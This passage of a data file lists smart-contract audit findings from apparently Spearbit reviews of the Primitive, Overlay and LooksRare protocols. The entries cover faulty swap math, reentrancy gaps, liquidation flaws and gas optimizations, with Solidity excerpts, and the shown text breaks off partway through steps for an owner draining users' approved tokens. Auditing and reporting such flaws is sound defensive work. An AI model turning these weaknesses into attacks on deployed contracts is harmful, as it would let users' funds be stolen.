console2.log(\"prev: %s\", prev); console2.log(\"post: %s\", post); assertEq(post, prev); assertEq(post, 0); }", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "getAmountOut Calculates an Output Value That Sets the Invariant to Zero, Instead of Preserving Its Value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The swap function enforces that the pool's invariant value does not decrease; however, the getA- mountOut function computes an expected swap output based on setting the pool's invariant to zero, which is only equivalent if the initial value of the invariant was already zero--which will generally not be the case as fees accrue and time passes. This is because in computeSwapStep (invoked by getAmountOut [1]), the func- tion (optimizeDependentReserve) passed [2] to the bisection algorithm for root finding returns just the invariant evaluated on the current arguments [3] instead of the difference between the evaluated and original invariant. As a consequence, getAmountOut will return an inaccurate result when the starting value of the invariant is non-zero, leading to either disadvantageous swaps or swaps that revert, depending on whether the current pool invariant value is less than or greater than zero.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "getAmountOut Does Not Adjust The Pool's Reserve Values Based on the liquidityDelta Parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The liquidityDelta parameter allows a caller to adjust the liquidity in a pool before simulating a swap. However, corresponding adjustments are not made to the per-pool reserves, virtualX and virtualY. This makes the reserve-to-liquidity ratios used in the calculations incorrect, leading to inaccurate results (or potentially reverts if the invalid values fall outside of allowed ranges). Use of the inaccurate swap outputs could lead either to swaps at bad prices or swaps that revert unexpectedly.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Bisection always uses max iterations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The current bisection algorithm chooses the mid point as root = (lower + upper) / 2; and the bisection terminates if either upper - lower < 0 or maxIterations is reached. Given upper >= lower throughout the code, it's easy to see that upper - lower < 0 can never be satisfied. The bisection will always use the max iterations. However, even with an epsilon of 1 it can happen that the mid point root is the same as the lower bound if upper = lower + 1. The if (output * lowerOutput < 0) condition will never be satisfied and the else case will always run, setting the lower bound to itself. The bisection will keep iterating with the same lower and upper bounds until max iterations are reached.", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "Potential reentrancy in claimFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The contract performs all transfers in the _settlement function and therefore _settlement can call- back to the user for reentrant tokens. To avoid reentrancy issues the _preLock() modifier implements a reentrancy check, but only if the called action is not happening during a multicall execution: function _preLock() private { // Reverts if the lock was already set and the current call is not a multicall. if (_locked != 1 && !_currentMulticall) { revert InvalidReentrancy(); } _locked = 2; } Therefore, multicalls are not protected against reentrancy and _settlement should never be executed, only once at the end of the original multicall function. However, the claimFee function can be called through a multicall by the protocol owner and it calls _settlement even if the execution is part of a multicall.", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "Bisection can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The Bisection algorithm tries to find a root of the monotonic function. Evaluating the expensive invariant function at the lower point on each iteration can be avoided by caching the output function value whenever a new lower bound is set.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Pool existence check in swap should happen earlier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The swap function makes use of the pool pair's tokens to scale the input decimals before it checks if the pool even exists.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Pool creation in test uses wrong duration and volatility", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The second path with pairId != 0 in HelperConfigsLib's pool creation calls the createPool method with the volatility and duration parameters swapped, leading to wrong pool creations used in tests that use this path.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Use unchecked in TickMath.sol and FullMath.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Uniswap math libraries rely on wrapping behaviour for conducting arithmetic operations. Solidity version 0.8.0 introduced checked arithmetic by default where operations that cause an overflow would revert. Since the code was adapted from Uniswap and written in Solidity version 0.7.6, these arithmetic operations should be wrapped in an unchecked block.", "labels": ["Spearbit", "Overlay", "Severity: High Risk"]}, {"title": "Liquidation might fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidate() function checks if a position can be liquidated and via liquidatable(), uses maintenanceMarginFraction as a factor to determine if enough value is left. However, in the rest of the liqui- date() function liquidationFeeRate is used to determine the fee paid to the liquidator. It is not necessarily true that enough value is left for the fee, as two different ways are used to calculate this which means that positions might be liquidated. This is classified as high risk because liquidation is an essential functionality of Overlay. contract OverlayV1Market is IOverlayV1Market { function liquidate(address owner, uint256 positionId) external { ... require(pos.liquidatable(..., maintenanceMarginFraction),\"OVLV1:!liquidatable\"); ... uint256 liquidationFee = value.mulDown(liquidationFeeRate); ... ovl.transfer(msg.sender, value - liquidationFee); ovl.transfer(IOverlayV1Factory(factory).feeRecipient(), liquidationFee); } } library Position { function liquidatable(..., uint256 maintenanceMarginFraction) ... { ... uint256 maintenanceMargin = posNotionalInitial.mulUp(maintenanceMarginFraction); can_ = val < maintenanceMargin; } } 4", "labels": ["Spearbit", "Overlay", "Severity: High Risk"]}, {"title": "Rounding down of snapAccumulator might influence calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function transform() lowers snapAccumulator with the following equation: (snapAccumulator * int256(dt)) / int256(snapWindow). During the time that snapAccumulator * dt is smaller than snapWindow this will be rounded down to 0, which means snapAccumulator will stay at the same value. Luckily, dt will eventually reach the value of snapWindow and by then the value wont be rounded down to 0 any more. Risk lies in calculations diverging from formulas written in the whitepaper. Note: Given medium risk severity because the probability of this happening is high, while impact is likely low. function transform(...) ... { ... snapAccumulator -= (snapAccumulator * int256(dt)) / int256(snapWindow); ... }", "labels": ["Spearbit", "Overlay", "Severity: Medium Risk"]}, {"title": "Verify pool legitimacy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The constructor in OverlayV1UniswapV3Factory.sol and OverlayV1UniswapV3Feed.sol only does a partial check to see if the pool corresponds to the supplied tokens. This is accomplished by calling the pools functions but if the pool were to be malicious, it could return any token. Additionally, checks can be by- passed by supplying the same tokens twice. Because the deployFeed() function is permissionless, it is possible to deploy malicious feeds. Luckily, the de- ployMarket() function is permissioned and prevents malicious markets from being deployed. contract OverlayV1UniswapV3Factory is IOverlayV1UniswapV3FeedFactory, OverlayV1FeedFactory { constructor(address _ovlWethPool, address _ovl, ...) { ovlWethPool = _ovlWethPool; // no check on validity of _ovlWethPool here ovl = _ovl; } function deployFeed(address marketPool, address marketBaseToken, address marketQuoteToken, ...) external returns (address feed_) { // Permissionless ... // no check on validity of marketPool here } 5 } contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { constructor( address _marketPool, address _ovlWethPool, address _ovl, address _marketBaseToken, address _marketQuoteToken, ... ) ... { ... address _marketToken0 = IUniswapV3Pool(_marketPool).token0(); // relies on a valid _marketPool address _marketToken1 = IUniswapV3Pool(_marketPool).token1(); require(_marketToken0 == WETH || _marketToken1 == WETH, \"OVLV1Feed: marketToken != WETH\"); marketToken0 = _marketToken0; marketToken1 = _marketToken1; require( _marketToken0 == _marketBaseToken || _marketToken1 == _marketBaseToken, \"OVLV1Feed: marketToken != marketBaseToken\" ); require( _marketToken0 == _marketQuoteToken || _marketToken1 == _marketQuoteToken, \"OVLV1Feed: marketToken != marketQuoteToken\" ); marketBaseToken = _marketBaseToken; // what if _marketBaseToken == _marketQuoteToken == WETH ? marketQuoteToken = _marketQuoteToken; marketBaseAmount = _marketBaseAmount; // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); // relies on a valid ,! _ovlWethPool address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); require( _ovlWethToken0 == WETH || _ovlWethToken1 == WETH, \"OVLV1Feed: ovlWethToken != WETH\" ); require( _ovlWethToken0 == _ovl || _ovlWethToken1 == _ovl, // What if _ovl == WETH ? \"OVLV1Feed: ovlWethToken != OVL\" ); ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; marketPool = _marketPool; ovlWethPool = _ovlWethPool; ovl = _ovl; }", "labels": ["Spearbit", "Overlay", "Severity: Medium Risk"]}, {"title": "Liquidatable positions can be unwound by the owner of the position", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidation function can be front-runned since it does not require any deposits. In particular, the liquidation function can be front-runned by the owner of the position by calling unwind. This effectively means that users can prevent themselves from getting liquidated by watching the mempool and frontrunning calls to their liquidation position by calling unwind. Although this behaviour is similar to liquidations in lending protocols where a borrower can front-run a liquidation by repaying the borrow, the lack of collateral requirements for both unwind and liquidation makes this case special. Note: In practice, transactions for liquidations do not end up in the public mempool and are often sent via private relays such as flashbots. Therefore, a scenario where the user finds out about a liquidatable position by the public mempool is likely not common. However, a similar argument still applies. Note: Overlay also allows the owner of the position to be the liquidator, unlike other protocols like compound. The difference in price computation for the liquidation and unwind mechanism may make it better for users to liquidate themselves rather than unwinding their position. However, a check similar to compound is not effective at preventing this issue since users can always liquidate themselves from another address.", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Adding constructor params causes creation code to change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Using constructor parameters in create2 makes the construction code different for every case. This makes address calculation more complex as you first have to calculate the construction code, hash it and then do address calculation. Whats worse is that Etherscan does not properly support auto-verification of contracts deployed via create2 with different creation code. Youll have to manually verify all markets individually. Additionally, needless salt in OverlayV1Factory.sol#L129.", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Potential wrap of timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "In the transform() function, a revert could occur right after timestamp32 has wrapped (e.g. when timestamp > 2**32). function transform(... , uint256 timestamp, ...) ... { uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32 ... uint256 dt = uint256(timestamp32 - self.timestamp); // could revert if timestamp32 has just wrapped ... }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Verify the validity of _microWindow and _macroWindow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The constructor of OverlayV1Feed doesnt verify the validity of _microWindow and _macroWindow, potentially causing the price oracle to produce bad results if misconfigured. constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Simplify _midFromFeed()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The calculation in _midFromFeed() is more complicated than necessary because: min(x,y) + max(x,y) == x + y. More importantly, the average operation (bid + ask) / 2 can overflow and revert if bid + ask >= 2**256. function _midFromFeed(Oracle.Data memory data) private view returns (uint256 mid_) { uint256 bid = Math.min(data.priceOverMicroWindow, data.priceOverMacroWindow); uint256 ask = Math.max(data.priceOverMicroWindow, data.priceOverMacroWindow); mid_ = (bid + ask) / 2; }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Use implicit truncation of timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Solidity will truncate data when it is typecast to a smaller data type, see solidity explicit-conversions. This can be used to simplify the following statement: uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Set pos.entryPrice to 0 after liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidate() function sets most of the values of pos to 0, with the exception of pos.entryPrice. function liquidate(address owner, uint256 positionId) external { ... // store the updated position info data. mark as liquidated pos.notional = 0; pos.debt = 0; pos.oiShares = 0; pos.liquidated = true; positions.set(owner, positionId, pos); ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Store result of expression in temporary variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Several gas optimizations are possible by storing the result of an expression in a temporary variable, such as the value of oiFromNotional(data, capNotionalAdjusted). 10 function build( ... ) { ... uint256 price = isLong ? ask(data, _registerVolumeAsk(data, oi, oiFromNotional(data, capNotionalAdjusted))) : bid(data, _registerVolumeBid(data, oi, oiFromNotional(data, capNotionalAdjusted))); ... require(oiTotalOnSide <= oiFromNotional(data, capNotionalAdjusted), \"OVLV1:oi>cap\"); }  A: The value of pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) could be stored in a temporary variable to save gas.  B: The value of oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) could also be stored in a temporary variable to save gas and make the code more readable.  C: The value of pos.oiSharesCurrent(fraction) could be stored in a temporary variable to save gas. function unwind(...) ... { ... uint256 price = pos.isLong ? bid( data, _registerVolumeBid( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A1 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B1 ) ) : ask( data, _registerVolumeAsk( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A2 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B2 ) ); ... if (pos.isLong) { oiLong -= Math.min( oiLong, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A3 ); oiLongShares -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); // C1 } else { oiShort -= Math.min( oiShort, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A4 ); oiShortShares -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); // C2 } ... pos.oiShares -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); // C3 } The value of 2 * k * timeElapsed could also be stored in a temporary variable: 11 function oiAfterFunding( ...) ... { ... if (2 * k * timeElapsed < MAX_NATURAL_EXPONENT) { fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Flatten code of OverlayV1UniswapV3Feed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Functions _fetch(), _inputsToConsultMarketPool(), _inputsToConsultOvlWethPool() and con- sult() do a lot of interactions with small arrays and loops over them, increasing overhead and reading difficulty.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Replace memory with calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "External calls to functions with memory parameters can be made more gas efficient by replacing memory with calldata, as long as the memory parameters are not modified.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "No need to cache immutable values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Variables microWindow and macroWindow are immutable, so it is not necessary to cache them because the compiler inlines their value. contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { function _fetch() internal view virtual override returns (Oracle.Data memory) { // cache micro and macro windows for gas savings uint256 _microWindow = microWindow; uint256 _macroWindow = macroWindow; ... } } abstract contract OverlayV1Feed is IOverlayV1Feed { ... uint256 public immutable microWindow; uint256 public immutable macroWindow; ... constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; } }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Simplify circuitBreaker", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function circuitBreaker() does a divDown() which can be circumvented to save gas and improving readability. function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) ... { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (uint256(minted).divDown(_circuitBreakerMintTarget) >= 2 * ONE) { return 0; } ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Optimizations if data.macroWindow is constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Several checks are done in contract OverlayV1Market which involve data.macroWindow in combi- nation with a linear calculation. If data.macroWindow does not change (as is the case with the UniswapV3 feed), it is possible to optimize the calculations by precalculating several values.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Remove unused / redundant functions and variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Functions nextPositionId() and mid() in OverlayV1Market.sol are not used internally and dont appear to be useful. contract OverlayV1Market is IOverlayV1Market { function nextPositionId() external view returns (uint256) { return _totalPositions; } function mid(Oracle.Data memory data,uint256 volumeBid,uint256 volumeAsk) ... { ... } } The functions oiInitial() and oiSharesCurrent() in library Position.sol have the same implementation. The oiInitial() function does not seem useful as it retrieves current positions and not initial ones. library Position { /// @notice Computes the initial open interest of position when built ... function oiInitial(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } /// @notice Computes the current shares of open interest position holds ... function oiSharesCurrent(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } } 15 The function liquidationPrice() in library Position.sol is not used from the contracts. Because it type is internal it cannot be called from the outside either. library Position { function liquidationPrice(... ) internal pure returns (uint256 liqPrice_) { ... } } The variables ovlWethToken0 and ovlWethToken1 are stored but not used anymore. constructor(..., address _ovlWethPool,...) .. { ... // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); ... ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization OverlayV1Market.sol#L536-L539,"]}, {"title": "Optimize power functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "In contract OverlayV1Market.sol, several power calculations are done with EULER / INVERSE_EULER as a base which can be optimized to save gas. function dataIsValid(Oracle.Data memory data) public view returns (bool) { ... uint256 dpLowerLimit = INVERSE_EULER.powUp(pow); uint256 dpUpperLimit = EULER.powUp(pow); ... } Note: As the Overlay team confirmed, less precision might be sufficient for this calculation. OverlayV1Market.sol: fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); OverlayV1Market.sol: bid_ = bid_.mulDown(INVERSE_EULER.powUp(pow)); OverlayV1Market.sol: ask_ = ask_.mulUp(EULER.powUp(pow)); 16", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Redundant Math.min()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function capNotionalAdjustedForCircuitBreaker() calculates circuitBreaker() and then does a Math.min(cap,...) with the result. However circuitBreaker() already returns a value that is <= cap. So the Math.min(...) function is unnecesary. 17 function capNotionalAdjustedForCircuitBreaker(uint256 cap) public view returns (uint256) { ... cap = Math.min(cap, circuitBreaker(snapshot, cap)); return cap; } function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) public view returns (uint256) { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (...) { return 0; } // so minted > _circuitBreakerMintTarget, thus minted / _circuitBreakerMintTarget > ONE ... uint256 adjustment = 2 * ONE - uint256(minted).divDown(_circuitBreakerMintTarget); // so adjustment <= ONE return cap.mulDown(adjustment); // so this is <= cap }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Replace square with multiplication", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The contract OverlayV1Market.sol contains the following expression several times: x.powDown(2 * ONE). This computes the square of x. However, it can also be calculated in a more gas efficient way: function oiAfterFunding(...) { ... uint256 underRoot = ONE - oiImbalanceBefore.divDown(oiTotalBefore).powDown(2 * ONE).mulDown( ONE - fundingFactor.powDown(2 * ONE) ); ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Retrieve roles via constants in import", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Within contract OverlayV1Factory.sol, the roles GOVERNOR_ROLE, MINTER_ROLE, BURNER_ROLE are retrieved via an external function call. To save gas they could also be retrieved as constants via import. Additionally, a role ADMIN_ROLE is defined in contract OverlayV1Token.sol, which is the same as DEFAULT_ADMIN_- ROLE of AccessControl.sol. This ADMIN_ROLE could be replaced with DEFAULT_ADMIN_ROLE. modifier onlyGovernor() { - + require(ovl.hasRole(ovl.GOVERNOR_ROLE(), msg.sender), \"OVLV1: !governor\"); require(ovl.hasRole(GOVERNOR_ROLE, msg.sender), \"OVLV1: !governor\"); _; } ... function deployMarket(...) { ... ovl.grantRole(ovl.MINTER_ROLE(), market_); ovl.grantRole(MINTER_ROLE, market_); ovl.grantRole(ovl.BURNER_ROLE(), market_); ovl.grantRole(BURNER_ROLE, market_); ... - + - + }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Double check action when snapAccumulator == 0 in transform()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function transform() does a check for snapAccumulator + value == 0 (where all variables are of type int256). This could be true if value == -snapAccumulator (or snapAccumulator == value == 0) A comment shows this is to prevent division by 0 later on. The division is based on abs(snapAccumulator) + abs(value). So this will only fail when snapAccumulator == value == 0. function transform(...) ... { ... int256 accumulatorNow = snapAccumulator + value; if (accumulatorNow == 0) { // if accumulator now is zero, windowNow is simply window // to avoid 0/0 case below return ... ---> this comment might not be accurate } ... uint256 w1 = uint256(snapAccumulator >= 0 ? snapAccumulator : -snapAccumulator); // w1 = abs(snapAccumulator) uint256 w2 = uint256(value >= 0 ? value : -value); uint256 windowNow = (w1 * (snapWindow - dt) + w2 * window) / (w1 + w2); // only fails if w1 == w2 == 0 ... // w2 = abs(value) ,! ,! }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Add unchecked in natural log (ln) function or remove the functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function ln() in contract LogExpMath.sol does not use unchecked, while the function log() does. Note: Neither ln() nor log() are used, so they could also be deleted. function log(int256 arg, int256 base) internal pure returns (int256) { unchecked { ... } } function ln(int256 a) internal pure returns (int256) { // no unchecked }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Specialized functions for the long and short side", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The functions build(), unwind() and liquidate() contain a large percentage of code that is differ- ent for the long and short side.", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Beware of chain dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The contracts have a few dependencies/assumptions which arent future proof and/or limit on which chain the code can be deployed. The AVERAGE_BLOCK_TIME is different on several EVM based chains. As the the Ethereum mainchain, the AVER- AGE_BLOCK_TIME will change to 12 seconds after the merge. contract OverlayV1Market is IOverlayV1Market { ... uint256 internal constant AVERAGE_BLOCK_TIME = 14; // (BAD) TODO: remove since not futureproof ... } WETH addresses are not the same on different chains. See Uniswap Wrapped Native Token Addresses. Note: Several chains have a different native token instead of ETH. 21 contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; ... }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Move _registerMint() closer to mint() and burn()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Within functions unwind() and liquidate() there is a call to _registerMint() as well as calls to ovl.mint() and ovl.burn(). However these two are quite a few lines apart so it is not immediately obvious they are related and operate on the same values. Additionally _registerMint() also registers burns. function unwind(...) ... { ... _registerMint(int256(value) - int256(cost)); ... // 40 lines of code if (value >= cost) { ovl.mint(address(this), value - cost); } else { ovl.burn(cost - value); } ... } function liquidate(address owner, uint256 positionId) external { ... _registerMint(int256(value) - int256(cost)); ... // 33 lines of code ovl.burn(cost - value); ... }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Use of Math.min() is error-prone", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Function Math.min() is used in two ways:  To get the smallest of two values, e.g. x = Math.min(x,y);  To make sure the resulting value is >=0, e.g. x -= Math.min(x,y); (note, there is an extra - in -= ) It is easy to make a mistake because both constructs are rather similar. Note: No mistakes have been found in the code. Examples to get the smallest of two values: OverlayV1Market.sol: tradingFee OverlayV1Market.sol: cap OverlayV1Market.sol: cap = Math.min(tradingFee, value); = Math.min(cap, circuitBreaker(snapshot, cap)); = Math.min(cap, backRunBound(data)); Examples to make sure the resulting value is >=0: OverlayV1Market.sol: oiLong -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares OverlayV1Market.sol: pos.notional OverlayV1Market.sol: pos.debt OverlayV1Market.sol: pos.oiShares OverlayV1Market.sol: oiLong oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares Position.sol: posCost -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= uint120( Math.min(pos.notional, pos.notionalInitial(fraction))); -= uint120( Math.min(pos.debt, pos.debtCurrent(fraction))); -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= Math.min(posCost, posDebt);", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Confusing use of term burn", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function oiAfterFunding() contains a comment that it burns a portion of the contracts. The term burn can be confused with burning of OVL. The Overlay team clarified that: The total aggregate open interest outstanding (oiLong + oiShort) on the market decreases over time with funding. Theres no actual burning of OVL. function oiAfterFunding(...) ... { ... // Burn portion of all aggregate contracts (i.e. oiLong + oiShort) // to compensate protocol for pro-rata share of imbalance liability ... return (oiOverweightNow, oiUnderweightNow); }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Document precondition for oiAfterFunding()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Function oiAfterFunding contains the following statement: uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; Nevertheless, if oiOverweightBefore < oiUnderweightBefore then statement will revert. Luckily, the update() function makes sure this isnt the case. function oiAfterFunding(uint256 oiOverweightBefore, uint256 oiUnderweightBefore, ...) ... { ... uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; // Could if oiOverweightBefore < oiUnderweightBefore ... } function update() public returns (Oracle.Data memory) { ... bool isLongOverweight = oiLong > oiShort; uint256 oiOverweight two uint256 oiUnderweight = isLongOverweight ? oiShort : the two (oiOverweight, oiUnderweight) = oiAfterFunding(oiOverweight, oiUnderweight, ...); ... = isLongOverweight ? oiLong : oiShort; // oiOverweight is the largest of the oiLong; // oiUnderweight is the smallest of ,! ,! }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Format numbers intelligibly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Solidity offers several possibilities to format numbers in a more readable way as noted below.", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "The Protocol owner can drain users' currency tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free. The owner can drain the funds as follows: 1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAs- setType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. 2. Signs an almost empty MakerAsk order and sets 